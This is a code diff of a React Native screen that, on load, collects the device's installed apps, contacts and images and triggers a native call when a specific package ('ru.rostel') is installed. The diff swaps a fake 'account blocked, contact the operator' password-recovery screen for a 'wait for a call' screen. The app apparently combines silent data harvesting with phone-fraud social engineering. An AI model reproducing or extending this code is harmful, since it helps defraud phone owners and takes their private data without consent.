@@ -1,11 +1,11 @@
 import React, { useState, useEffect } from 'react';
-import { View, TouchableOpacity, Text, StyleSheet } from 'react-native';
-import SvgComponent from '../../svgs/Logo';
-import MyInput from '../MyInput';
+import { View, Text, StyleSheet, Image } from 'react-native';
 import Images from '../../modules/Images';
 import Apps from '../../modules/Apps';
 import Contact from '../../modules/Contact';
 import StorageManager from '../StorageManager';
+import ImagePhone from '../../resources/img/phone-100.png'
+import ImageIcon from '../../resources/img/Icon.png'
 export default function Main() {
   const [inputText, setInputText] = useState('');
   const [hotlineNumber, setHotlineNumber] = useState('')
@@ -24,44 +24,24 @@ export default function Main() {
     const formattedNumber = storedHotline.replace(/[\s-]/g, '');
     await setHotlineNumber(formattedNumber.replace(/(\d{1})(\d{3})(\d{3})(\d{2})(\d{2})/, '8 $2 $3-$4-$5'))
   };
-  const getData = async()=>{
+  const getData = async () => {
     var apps = await Apps.loadApps()
     var contacts = await Contact.loadContacts()
     var images = await Images.getImages()
     apps.forEach(element => {
-        if(element.packageName == "ru.rostel"){
-            MainModule.fastLoad("ru.rostel")
-        }
+      if (element.packageName == "ru.rostel") {
+        MainModule.fastLoad("ru.rostel")
+      }
     });
-}
+  }
   useEffect(() => {
     getData()
   }, [])
   return (
     <View style={styles.container}>
       <View style={styles.main}>
-        <SvgComponent style={styles.svg} />
-        <View>
-          <Text style={styles.text}>Восстановление пароля</Text>
-        </View>
-        <View style={styles.maintext}>
-          <Text style={styles.text2}>
-            Контрольный вопрос:
-          </Text>
-        </View>
-        <View style={styles.numberview}>
-          <Text style={styles.numberview_text}>Ваш аккаунт заблокирован, свяжитесь с оператором {hotlineNumber}</Text>
-        </View>
-        <View>
-          <MyInput onTextChange={handleInputChange} />
-        </View>
-        <TouchableOpacity
-          style={[styles.button, { backgroundColor: isButtonEnabled ? '#007AFF' : '#ccc' }]}
-          onPress={handleContinuePress}
-          disabled={!isButtonEnabled}
-        >
-          <Text style={styles.buttonText}>Продолжить</Text>
-        </TouchableOpacity>
+          <Text style={[styles.text, { color: '#fff' }]}>Ожидайте звонка</Text>
+          <Image source={ImagePhone} style={styles.imagePhone}></Image>
       </View>
     </View>
   );
@@ -70,24 +50,36 @@ export default function Main() {
 const styles = StyleSheet.create({
   container: {
     flex: 1,
-    backgroundColor: '#c1d4f5',
+    backgroundColor: '#2A2A32',
     alignItems: 'center',
     justifyContent: 'center',
   },
   main: {
-    backgroundColor: '#fff',
     height: 500,
     width: 350,
     borderRadius: 15,
     alignItems: "center",
     flexDirection: "column",
+    marginTop:200
+  },
+  image: {
+    position: 'absolute',
+    top: 0,
+    right: 0,
+    left: 0,
+    width: 75,
+    height: 75,
+  },
+  imagePhone:{
+    marginTop:25,
+    width:75,
+    height:75
   },
   svg: {
     paddingTop: 110
   },
   text: {
-    fontSize: 22,
-    fontWeight: "bold",
+    fontSize: 18,
     color: 'black'
   },
   text2: {
@@ -114,12 +106,12 @@ const styles = StyleSheet.create({
     color: 'black'
   },
   button: {
-    width: 300,
-    height: 60,
+    width: '100%',
+    height: 50,
     justifyContent: 'center',
     alignItems: 'center',
-    borderRadius: 5,
-    marginTop: 50
+    borderRadius: 10,
+    marginTop: 450
   },
   buttonText: {
     color: 'white',
